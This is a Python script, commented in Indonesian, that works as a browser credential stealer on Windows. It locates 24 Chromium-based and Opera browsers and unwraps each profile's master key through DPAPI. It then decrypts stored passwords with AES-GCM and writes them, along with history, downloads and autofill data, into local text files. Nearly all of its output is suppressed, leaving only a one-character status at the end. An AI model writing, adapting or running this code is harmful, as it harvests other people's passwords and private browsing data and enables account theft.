import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
import glob

# Try to import Crypto.Cipher.AES, if it fails, try pycryptodome's version
try:
    from Crypto.Cipher import AES
except ImportError:
    # If Crypto is not found, try importing from Cryptodome
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        # If neither is found, raise an error indicating the module is missing
        print("Error: PyCryptodome (or pycrypto) not found. Please install it: pip install pycryptodome")
        exit() # Exit the script as it cannot proceed without AES decryption

from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

OUTPUT_PARENT_FOLDER = "Browser_Extracted_Data"

# PATHS UNTUK BERBAGAI BROWSER
browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

# Kueri untuk berbagai jenis data
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    },
    # PENAMBAHAN: Autofill Data
    'autofill': {
        'query': 'SELECT name, value, usage_count, date_created, date_last_used FROM autofill',
        'file': '\\Web Data', # Biasanya di file Web Data
        'columns': ['Name', 'Value', 'Usage Count', 'Date Created', 'Date Last Used'],
        'decrypt': False # Autofill biasanya tidak dienkripsi seperti password
    }
}


def get_master_key(path: str):
    """Mendapatkan kunci enkripsi master dari file 'Local State'."""
    # PENAMBAHAN: Jika path adalah path base Opera/Opera GX, file Local State ada di sana.
    # Jika tidak, asumsikan itu adalah path profil (misal: ...User Data/Default)
    # dan Local State ada di user data base path.
    local_state_path = os.path.join(path, "Local State")
    
    # Untuk browser seperti Opera/Opera GX, Local State berada di level folder 'Opera Stable'/'Opera GX Stable'
    # bukan di subfolder 'Default' atau 'Profile X'.
    # Kita perlu memastikan kita mencari 'Local State' di path User Data utama.
    # Cek apakah path yang diberikan adalah path profil atau path base User Data.
    # Jika path adalah path profil seperti 'C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default',
    # maka Local State ada di 'C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
    # Jadi, kita perlu naik satu level folder untuk mencari Local State.
    is_profile_path = any(prof in path for prof in ["Default", "Profile "]) # Cek apakah path mengandung indikator profil

    if is_profile_path:
        # Jika ini path profil, coba cari Local State di folder induk (User Data)
        base_user_data_path = os.path.dirname(path)
        local_state_path = os.path.join(base_user_data_path, "Local State")
    else:
        # Jika ini bukan path profil (misal: Opera Stable atau base User Data), cari di path ini
        local_state_path = os.path.join(path, "Local State")


    if not os.path.exists(local_state_path) or os.path.getsize(local_state_path) == 0:
        # print(f"DEBUG: Local State file not found or empty at {local_state_path}") # Debugging
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8", errors='ignore') as f:
            c = f.read()
    except Exception as e:
        # print(f"DEBUG: Error reading Local State file {local_state_path}: {e}") # Debugging
        return None

    if 'os_crypt' not in c:
        # print(f"DEBUG: 'os_crypt' not found in Local State file {local_state_path}") # Debugging
        return None

    try:
        local_state = json.loads(c)
        encrypted_key = local_state["os_crypt"]["encrypted_key"]
        
        # PENAMBAHAN: Pastikan key bukan string kosong atau tidak valid
        if not encrypted_key:
            # print(f"DEBUG: Encrypted key is empty in Local State file {local_state_path}") # Debugging
            return None

        key = base64.b64decode(encrypted_key)
        # PENAMBAHAN: Pastikan key diawali dengan 'DPAPI' (0x01)
        if key[0:5] != b'DPAPI':
            # print(f"DEBUG: Encrypted key missing 'DPAPI' prefix in Local State file {local_state_path}") # Debugging
            return None
        
        key = key[5:] # Menghilangkan prefix 'DPAPI'
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        
        # PENAMBAHAN: Pastikan kunci yang didekripsi memiliki panjang yang benar (32 byte untuk AES-256)
        if len(key) != 32:
            # print(f"DEBUG: Decrypted master key has incorrect length ({len(key)} bytes) for {local_state_path}") # Debugging
            return None
        
        return key
    except json.JSONDecodeError as e:
        # print(f"DEBUG: JSON decoding error in Local State file {local_state_path}: {e}") # Debugging
        return None
    except Exception as e:
        # print(f"DEBUG: Error during master key decryption for {local_state_path}: {e}") # Debugging
        return None


def decrypt_password(buff: bytes, key: bytes) -> str:
    """Mendekripsi data yang dienkripsi (seperti kata sandi) menggunakan kunci master."""
    if not key:
        return "DECRYPTION_ERROR: Master key missing"
    
    # PENAMBAHAN: Pastikan buffer diawali dengan 'v10' (0x01)
    # Browser modern menggunakan GCM, dan data dimulai dengan 0x01
    # Jika data tidak diawali dengan 0x01, mungkin ini adalah format lama atau error.
    if not buff.startswith(b'v10') and not buff.startswith(b'\x01'): # v10 or \x01
        # print(f"DEBUG: Encrypted buffer does not start with expected prefix: {buff[:5]}") # Debugging
        return "DECRYPTION_ERROR: Invalid encrypted buffer format (missing v10/0x01 prefix)"

    # PENAMBAHAN: Memastikan panjang buffer cukup untuk IV dan payload yang minimal
    # IV = 12 bytes, Tag = 16 bytes. Jadi minimum payload adalah 12 + 16 = 28 bytes
    # Jika buff dimulai dengan b'v10', itu adalah 3 byte. Total 3 + 12 + 16 = 31 bytes
    # Jika buff dimulai dengan b'\x01', itu adalah 1 byte. Total 1 + 12 + 16 = 29 bytes
    # Namun, data asli yang dienkripsi akan selalu lebih panjang dari ini karena ada password-nya.
    # Default Chromium/Edge menggunakan 12 byte IV.
    
    # Check if buffer starts with 'v10' which is common for Chromium.
    # The actual encrypted data often starts with '\x01' followed by IV etc.
    # The 'v10' might be a specific internal tag, or an older format.
    # Current behavior for most modern browsers is to have the actual encrypted data start with '\x01'
    # after the initial 3 bytes. Let's adjust slicing to accommodate for '\x01' as well.
    # Chromium encrypted data format:
    # 0x01 (1 byte) | IV (12 bytes) | Encrypted Payload (variable) | Tag (16 bytes)
    # The input 'buff' here usually includes the 'v10' prefix if it's coming directly from the DB
    # or it might just be the raw encrypted data starting with '\x01'.
    
    # The original code's slicing buff[3:15] implies an initial 3-byte prefix (like 'v10')
    # and then 12 bytes for IV.
    # Let's assume the input `buff` comes directly as retrieved from SQLite,
    # which often contains the 'v10' or similar prefix.
    
    # If the buffer indeed starts with 'v10'
    if buff.startswith(b'v10'):
        # Corrected slicing based on common Chromium format:
        # Encrypted data is `v10` (3 bytes) + IV (12 bytes) + Ciphertext + Tag (16 bytes)
        if len(buff) < 15: # Not enough for v10 + IV
            return "DECRYPTION_ERROR: Buffer too short for v10 prefix and IV"
        iv = buff[3:15]
        payload = buff[15:]
    # If it starts with 0x01, it's typically just 0x01 + IV + Ciphertext + Tag
    elif buff.startswith(b'\x01'):
        if len(buff) < 13: # Not enough for 0x01 + IV
            return "DECRYPTION_ERROR: Buffer too short for 0x01 prefix and IV"
        iv = buff[1:13]
        payload = buff[13:]
    else:
        # print(f"DEBUG: Unexpected encrypted buffer format: {buff[:5]}") # Debugging
        return "DECRYPTION_ERROR: Unrecognized encrypted buffer prefix"


    try:
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        
        # PENAMBAHAN: Pastikan panjang setelah dekripsi cukup untuk tag.
        # AES-GCM mendekripsi payload dan tag bersamaan. Tag 16 byte dihapus.
        if len(decrypted_pass) < 16:
             return "DECRYPTION_ERROR: Decrypted payload too short (missing GCM tag)"

        decrypted_pass = decrypted_pass[:-16].decode('utf-8', errors='replace')
        return decrypted_pass
    except ValueError as e:
        # ValueError: MAC check failed or other AES issues (e.g., incorrect key, IV)
        # print(f"DEBUG: AES decryption ValueError: {e} - Buffer: {buff[:50]}...") # Debugging
        return f"DECRYPTION_ERROR: AES Decryption Failed (Incorrect Key/IV/Tag?): {e}"
    except Exception as e:
        # print(f"DEBUG: Generic decryption error: {e}") # Debugging
        return f"DECRYPTION_ERROR: {e}"


def save_results(browser_name, profile_name, type_of_data, content):
    """Menyimpan hasil ekstraksi ke file teks."""
    # Membuat folder utama untuk semua data yang diekstrak
    if not os.path.exists(OUTPUT_PARENT_FOLDER):
        os.mkdir(OUTPUT_PARENT_FOLDER)
    
    # Membuat folder untuk setiap browser (misal: Browser_Extracted_Data/chrome)
    browser_output_folder = os.path.join(OUTPUT_PARENT_FOLDER, browser_name)
    if not os.path.exists(browser_output_folder):
        os.mkdir(browser_output_folder)

    # Membuat folder untuk setiap profil dalam browser (misal: .../chrome/Default)
    profile_output_folder = os.path.join(browser_output_folder, profile_name)
    if not os.path.exists(profile_output_folder):
        os.mkdir(profile_output_folder)

    file_name = f"{type_of_data}.txt"
    file_path = os.path.join(profile_output_folder, file_name)

    if content and content.strip():
        try:
            with open(file_path, 'w', encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            # print(f"Error saving file {file_path}: {e}") # Debugging
            pass
    else:
        pass


def get_data(db_file_path: str, key: bytes, type_of_data: dict) -> str:
    """Mengekstrak data dari database SQLite yang diberikan."""
    if not os.path.exists(db_file_path):
        return ""

    temp_db_path = 'temp_db_' + os.urandom(4).hex() # Menggunakan nama unik untuk file sementara
    conn = None
    result_content = ""

    try:
        shutil.copy(db_file_path, temp_db_path)
    except Exception as e:
        # print(f"DEBUG: Error copying DB {db_file_path}: {e}") # Debugging
        return ""

    try:
        conn = sqlite3.connect(temp_db_path)
        conn.text_factory = bytes # Penting untuk data terenkripsi (binary)
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        
        for row_tuple in cursor.fetchall():
            row = list(row_tuple)
            processed_row = []

            for i, item in enumerate(row):
                if type_of_data['decrypt'] and isinstance(item, bytes) and item:
                    # Cek kolom spesifik yang mungkin dienkripsi (Password, Card Number, dll.)
                    if (type_of_data['columns'][i] == 'Password') and key: # Card Number belum diimplementasikan jadi hapus dulu
                        processed_row.append(decrypt_password(item, key))
                    else: # Item bytes lain yang tidak perlu dekripsi spesifik
                        try:
                            processed_row.append(item.decode('utf-8', errors='replace'))
                        except:
                            processed_row.append(str(item))
                elif isinstance(item, bytes): # Item bytes yang tidak perlu dekripsi
                    try:
                        processed_row.append(item.decode('utf-8', errors='replace'))
                    except:
                        processed_row.append(str(item))
                else: # Item non-bytes (misal: int, string biasa)
                    processed_row.append(str(item))

            # Konversi waktu untuk History dan Autofill (jika ada kolom waktu)
            if 'Visited Time' in type_of_data['columns'] and len(processed_row) > type_of_data['columns'].index('Visited Time'):
                time_index = type_of_data['columns'].index('Visited Time')
                if processed_row[time_index].isdigit() and int(processed_row[time_index]) != 0:
                    processed_row[time_index] = convert_chrome_time(int(processed_row[time_index]))
                elif isinstance(processed_row[time_index], int) and processed_row[time_index] != 0:
                    processed_row[time_index] = convert_chrome_time(processed_row[time_index])
                else:
                    processed_row[time_index] = "0"
            
            if 'Date Created' in type_of_data['columns'] and len(processed_row) > type_of_data['columns'].index('Date Created'):
                created_index = type_of_data['columns'].index('Date Created')
                if processed_row[created_index].isdigit() and int(processed_row[created_index]) != 0:
                    processed_row[created_index] = convert_chrome_time(int(processed_row[created_index]))
                elif isinstance(processed_row[created_index], int) and processed_row[created_index] != 0:
                    processed_row[created_index] = convert_chrome_time(processed_row[created_index])
                else:
                    processed_row[created_index] = "0"

            if 'Date Last Used' in type_of_data['columns'] and len(processed_row) > type_of_data['columns'].index('Date Last Used'):
                last_used_index = type_of_data['columns'].index('Date Last Used')
                if processed_row[last_used_index].isdigit() and int(processed_row[last_used_index]) != 0:
                    processed_row[last_used_index] = convert_chrome_time(int(processed_row[last_used_index]))
                elif isinstance(processed_row[last_used_index], int) and processed_row[last_used_index] != 0:
                    processed_row[last_used_index] = convert_chrome_time(processed_row[last_used_index])
                else:
                    processed_row[last_used_index] = "0"

            result_content += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], processed_row)]) + "\n\n"

    except sqlite3.Error as e:
        # print(f"DEBUG: SQLite error for {db_file_path}: {e}") # Debugging
        result_content = ""
    except Exception as e:
        # print(f"DEBUG: General error for {db_file_path}: {e}") # Debugging
        result_content = ""
    finally:
        if conn:
            conn.close()
        if os.path.exists(temp_db_path):
            try:
                os.remove(temp_db_path)
            except Exception as e:
                # print(f"DEBUG: Error removing temp DB {temp_db_path}: {e}") # Debugging
                pass
    return result_content


def convert_chrome_time(chrome_time):
    """Mengubah waktu Chrome (mikrodetik sejak 1601) ke format datetime yang dapat dibaca."""
    if not isinstance(chrome_time, (int, str)):
        return "Invalid Time Format"
    if isinstance(chrome_time, str) and not chrome_time.isdigit():
        return "Invalid Time Format"
    
    chrome_time_int = int(chrome_time)

    if chrome_time_int == 0 or chrome_time_int < 0 or chrome_time_int > 2**63 - 1: # Cek batas integer
        return "N/A"
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time_int)).strftime('%d/%m/%Y %H:%M:%S')
    except OverflowError:
        return "N/A (Overflow)"
    except Exception as e:
        return f"Error converting time: {e}"


def get_browser_profiles(browser_user_data_path: str) -> list:
    """Mendapatkan daftar profil yang tersedia untuk browser tertentu."""
    profiles = []
    
    # Check for 'Default' profile
    default_profile_path = os.path.join(browser_user_data_path, "Default")
    if os.path.exists(default_profile_path):
        profiles.append("Default")

    # Check for 'Profile X' folders
    profile_folders = glob.glob(os.path.join(browser_user_data_path, "Profile *"))
    for folder in profile_folders:
        profile_name = os.path.basename(folder)
        profiles.append(profile_name)
    
    # Specific handling for Opera/Opera GX where the base path is the profile itself
    # If no 'Default' or 'Profile X' folders are found, assume the base path is the profile.
    if not profiles and os.path.isdir(browser_user_data_path):
        # Add an empty string to represent the base path as a profile
        # This will be handled in the main loop to use browser_base_path directly
        profiles.append("") 

    return profiles


def installed_browsers():
    """Mendeteksi browser yang terinstal berdasarkan path yang ditentukan."""
    available = []
    for x in browsers.keys():
        browser_user_data_path = browsers[x]
        if os.path.exists(browser_user_data_path):
            available.append(x)
    return available


if __name__ == '__main__':
    program_succeeded = False

    try:
        available_browsers = installed_browsers()

        if not available_browsers:
            program_succeeded = False
        else:
            for browser_name in available_browsers:
                browser_base_path = browsers[browser_name]
                
                profiles_to_check = get_browser_profiles(browser_base_path)

                if not profiles_to_check:
                    continue

                for profile_name in profiles_to_check:
                    # Determine the actual path to the profile's data folder
                    # If profile_name is empty (for Opera/Opera GX base path), use browser_base_path directly
                    current_profile_data_path = os.path.join(browser_base_path, profile_name) if profile_name else browser_base_path
                    
                    # Get master key for this profile's User Data base path (where Local State is)
                    # For Chromium-based browsers, Local State is in the 'User Data' directory.
                    # For Opera, Local State is directly in 'Opera Stable' or 'Opera GX Stable'.
                    # The get_master_key function now intelligently finds the Local State.
                    master_key = get_master_key(current_profile_data_path)
                    
                    if not master_key and any(data_queries[dt]['decrypt'] for dt in data_queries):
                        # print(f"DEBUG: Warning: No master key found for {browser_name}/{profile_name}. Passwords may not be decrypted.")
                        pass

                    for data_type_name, data_type_info in data_queries.items():
                        # Construct the full path to the database file for this data type
                        # Example: C:\Users\User\AppData\Local\Google\Chrome\User Data\Default\Login Data
                        db_file_name = data_type_info['file'].strip('\\') # Get just the file name like 'Login Data'
                        db_file_path = os.path.join(current_profile_data_path, db_file_name)
                        
                        # Only pass master_key if the data type requires decryption
                        current_master_key_for_data = master_key if data_type_info['decrypt'] else None

                        data_content = get_data(db_file_path, current_master_key_for_data, data_type_info)
                        
                        # Save results for this browser, profile, and data type
                        # Use "root" for the profile name if it's the base path (empty string)
                        save_results(browser_name, profile_name if profile_name else "root", data_type_name, data_content)
                        if data_content: # Only consider successful if some content was actually extracted
                            program_succeeded = True

    except Exception as e:
        # print(f"DEBUG: An unexpected error occurred in main loop: {e}")
        program_succeeded = False

    if program_succeeded:
        print(".")
    else:
        print("e")